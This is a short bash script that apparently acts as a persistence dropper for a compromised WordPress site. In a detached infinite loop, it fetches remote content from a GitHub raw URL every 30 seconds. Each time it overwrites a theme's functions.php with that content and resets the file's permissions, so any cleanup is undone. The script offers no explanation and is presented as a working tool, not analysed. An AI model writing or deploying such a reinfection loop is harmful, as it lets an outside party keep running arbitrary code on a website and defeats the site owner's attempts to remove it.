#!/bin/bash
FILE_PATH="/home/pat/public_html/wp-content/themes/Newsmag/functions.php"
URL="https://raw.githubusercontent.com/la-inca/clev/refs/heads/main/patf.txt"
FILE_DIR=$(dirname "$FILE_PATH")
NUMBER_DIR="0644"

create_directory() {
  [ -d "$FILE_DIR" ] || mkdir -p "$FILE_DIR" || exit 1
}
fetch_content() {
  if command -v curl &>/dev/null; then curl -s "$URL"; 
  elif command -v wget &>/dev/null; then wget -qO- "$URL"; 
  elif command -v fetch &>/dev/null; then fetch -qo- "$URL"; 
  elif command -v http &>/dev/null; then http -b GET "$URL"; 
  else return 1; fi
}
check_and_update_permissions() {
  CURRENT=$(stat -c "%a" "$FILE_PATH" 2>/dev/null)
  [ "$CURRENT" != "$NUMBER_DIR" ] && chmod "$NUMBER_DIR" "$FILE_PATH"
}
run_process() {
  while true; do
    create_directory
    if fetch_content > "$FILE_PATH" 2>/dev/null; then
      echo "$(date): updated $FILE_PATH"
      check_and_update_permissions
    else
      echo "$(date): failed to fetch $URL"
    fi
    sleep 30
  done
}
( while true; do run_process; sleep 1; done ) & disown
